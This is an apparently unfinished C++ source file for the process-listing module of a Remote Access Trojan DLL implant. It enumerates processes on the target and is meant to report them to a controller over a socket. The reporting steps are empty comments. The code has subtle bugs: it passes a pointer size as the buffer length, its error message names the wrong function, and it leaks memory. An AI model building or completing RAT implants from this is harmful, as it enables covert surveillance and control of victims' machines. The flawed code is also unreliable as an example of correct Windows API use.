// Patrick Sacchet (@pjsacchet)
// Verison 1.0.
// RAT-Dll-Process.cpp : Defines functionality for performing a process on target, i.e., capture information about a current running process or list all processes running

#include "RAT-Dll-Process.h"
#include "RAT-Dll-Connect.h"
#include <psapi.h>


/** Handle socket work and function calls for performing process listing functionality
* clientSock - current open client socket to implant
return:
* if successful we return SUCCESS; otherwise print error code and handle appropiately
*/
INT handleProcessList(SOCKET clientSock)
{
	 INT status = SUCCESS, numProcesses = 0;
	 CHAR msgBuf[DEFAULT_BUF_LEN];
	 CHAR* processNames = NULL, * processPIDs = NULL;

	 // Grab a list of process names and their PIDs
	 status = doProcessList(&processNames, &processPIDs, &numProcesses);
	 if (status != SUCCESS)
	 {
		 sprintf_s(msgBuf, "RAT-Dll-Process::handleProcessList - Failure received from handleScreenshot %d\n", status);
		 OutputDebugStringA(msgBuf);
		 goto cleanup;
	 }
	  
	 // Send back the number of processes we found first 

	 // Iterate through each list, append them into one message response and send them back

	 // Send success reponse code 


cleanup:
	return status;
}


INT doProcessList(__out CHAR** processNames, __out CHAR** processPIDs, __out INT* numProcesses)
{
	INT status = SUCCESS;
	DWORD *aProcesses = NULL, cbNeeded = 0, cProcesses = 0;
	CHAR msgBuf[DEFAULT_BUF_LEN];
	UINT64 i;

	// We expect this to fail so we can precisely grab the proper number of processes running on target 
	if (!EnumProcesses(aProcesses, 0, &cbNeeded))
	{
		aProcesses = (DWORD*)malloc(sizeof(DWORD) * cbNeeded);
		if (aProcesses == NULL)
		{
			OutputDebugStringA("RAT-Dll-Process::doProcessList - Failed to allocate enough memory!\n");
			status = FAILURE;
			goto cleanup;
		}

		// We failed for real this time
		if (!EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded))
		{
			sprintf_s(msgBuf, "RAT-Dll-Process::doProcessList - Failure received from EnumProcesses %d\n", status);
			OutputDebugStringA(msgBuf);
			status = FAILURE;
			goto cleanup;
		}
	}

	// This succeeded when it shouldn't have...
	else
	{
		OutputDebugStringA("RAT - Dll - Process::doProcessList - EnumProcesses succeeded!Should have failed...\n");
		status = FAILURE;
		goto cleanup;
	}

	// TODO: Could call EnumProcessModulesEx for module information...
	cProcesses = cbNeeded / sizeof(DWORD);

	*numProcesses = cProcesses;





cleanup: 
	return status;
}